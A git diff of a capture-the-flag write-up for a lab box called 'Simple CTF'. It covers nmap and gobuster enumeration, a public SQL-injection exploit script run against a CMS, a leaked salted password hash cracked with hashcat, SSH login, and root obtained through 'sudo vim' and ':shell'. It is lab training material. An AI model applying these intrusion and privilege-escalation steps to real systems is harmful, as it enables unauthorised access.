@@ -4,6 +4,16 @@
 
 ----------------------------------------
 
+- [Simple CTF](#simple-ctf)
+  - [Hosts](#hosts)
+  - [Enumeration](#enumeration)
+    - [nmap](#nmap)
+    - [Directory Busting](#directory-busting)
+  - [Exploitation](#exploitation)
+    - [Accessing the System](#accessing-the-system)
+    - [Privilege Escalation](#privilege-escalation)
+  - [Flags](#flags)
+
 ## Hosts
 
 ```bash
@@ -20,25 +30,28 @@ sudo nmap -p- -oN nmap/full 10.10.93.22
 sudo nmap -p 1000 10.10.93.22 
 ``` 
 
-Port 21 is open = ftp server,  anonymous login enabled 
-Port 80 is open = http webserver
-Port 2222 is open = ssh 
+> Port 21 is open = ftp server,  anonymous login enabled 
+> Port 80 is open = http webserver
+> Port 2222 is open = ssh 
 
 ### Directory Busting
 
 ```bash
 gobuster dir -u http://10.10.93.22/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
-
 ``` 
-Directory /simple appears to be a CMS, vulnerable to SQLi
+
+> Found directory /simple
+> It appears to be a CMS system, vulnerable to SQLi Attacks
 
 ## Exploitation
+
+### Accessing the System
 
 ```bash
 python 46635.py -u http://10.10.93.22/simple --crack 10k-most-common.txt
 ``` 
 
-Cracking with the exploit failed, but we got the hash and the salt for the mitch's password.
+> Cracking with the exploit failed, but we got the hash and the salt for mitch's password.
 
 ```
 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
@@ -48,16 +61,27 @@ Cracking with the exploit failed, but we got the hash and the salt for the mitch
 hashcat -m 20 -a 0 crack.txt 10k-most-common.txt
 ```
 
+> Haschat was able to crack the password
+> Logged in as the mitch user using ssh (tcp/2222)
+> Found the user flag in ```/home/mitch```
+
+### Privilege Escalation
+
 ```bash
 $ sudo -l      
 User mitch may run the following commands on Machine:
     (root) NOPASSWD: /usr/bin/vim
-```  
+``` 
+
+> Mitch can run the vim command as sudo, this can probably be abused in order to privesc
 
 ```bash
 $ sudo vim
 :shell
-```  
+```
+
+> Starting vim as sudo and the using the ```:shell``` we have a root shell. 
+> Found the root flag in ```/root```
 
 ## Flags 
 
